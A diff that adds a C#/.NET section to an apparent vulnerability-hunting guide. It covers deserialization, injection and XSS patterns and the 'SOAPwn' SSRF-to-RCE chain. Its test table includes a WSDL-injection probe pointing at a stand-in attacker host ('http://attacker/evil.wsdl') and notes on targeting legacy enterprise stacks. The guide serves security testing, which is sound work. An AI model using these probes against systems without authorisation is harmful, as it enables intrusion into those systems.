@@ -167,6 +167,46 @@ app.post('/webhook', (req, res) => {
 
 ---
 
+## C# / .NET
+
+| Pattern | Risk |
+|---------|------|
+| `BinaryFormatter.Deserialize()` on untrusted input | RCE via deserialization gadget chains — .NET deprecated BinaryFormatter but legacy code persists |
+| `Process.Start()` with user-controlled arguments | Command injection |
+| String interpolation in EF Core raw SQL (`FromSqlRaw`, `ExecuteSqlRaw`) | SQL injection |
+| `Controller.Content()` or `@Html.Raw()` with user input | XSS |
+| Missing `[ValidateAntiForgeryToken]` on state-changing actions | CSRF |
+| `XmlSerializer` / `DataContractSerializer` with user-controlled type | Type confusion → RCE |
+| **SOAP/WCF `HttpWebClientProtocol` (SOAPwn)** | **SSRF → RCE chain — PortSwigger Top 10 2025 #5** |
+
+### SOAPwn: .NET SOAP Web Service Exploitation (PortSwigger Top 10 2025 #5)
+
+**What it is:** .NET Framework's `HttpWebClientProtocol` class (base for auto-generated SOAP clients) contains exploitable SSRF and deserialization gadgets. Researcher Piotr Bazydlo demonstrated a full SSRF-to-RCE chain through SOAP client proxy classes.
+
+**Attack chain:**
+1. **SSRF via WSDL loading** — SOAP client classes that dynamically fetch WSDL from user-controlled URLs allow server-side HTTP requests to internal services
+2. **Deserialization via SOAP response** — Malicious SOAP response triggers .NET deserialization gadgets (similar to ysoserial.net chains) when the client deserializes the response object
+3. **Type confusion** — SOAP type mappings allow attacker to supply unexpected types that trigger dangerous deserialization paths
+
+**Where to look:**
+- .NET Framework applications with SOAP/WCF service references (look for `Reference.svcmap`, `.asmx` endpoints, `ServiceReference` directories)
+- Enterprise applications with internal SOAP integrations (CRM, ERP, payment processors)
+- Legacy .NET Framework 4.x applications (most affected — .NET Core/5+ mostly uses REST)
+- Any endpoint accepting `Content-Type: text/xml` or `application/soap+xml`
+
+**Test patterns:**
+
+| # | Test | What to look for |
+|---|------|-----------------|
+| 1 | WSDL URL injection | Supply `?wsdl=http://attacker/evil.wsdl` — does server fetch your WSDL? |
+| 2 | SOAP response deserialization | Serve malicious SOAP response with .NET gadget chain payload |
+| 3 | Type confusion | Send SOAP response with unexpected type in `xsi:type` attribute |
+| 4 | XXE via SOAP | Inject `<!DOCTYPE>` in SOAP envelope — .NET's XML parser may resolve external entities |
+
+**Severity Guidance:** Critical when SSRF-to-RCE chain is achievable. The SOAPwn research demonstrated full RCE on .NET Framework applications. High when SSRF alone is achievable (internal service access). Focus on enterprise targets with legacy .NET stacks.
+
+---
+
 ## Rust (Web Frameworks — Actix, Axum, Rocket)
 
 | Pattern | Risk |
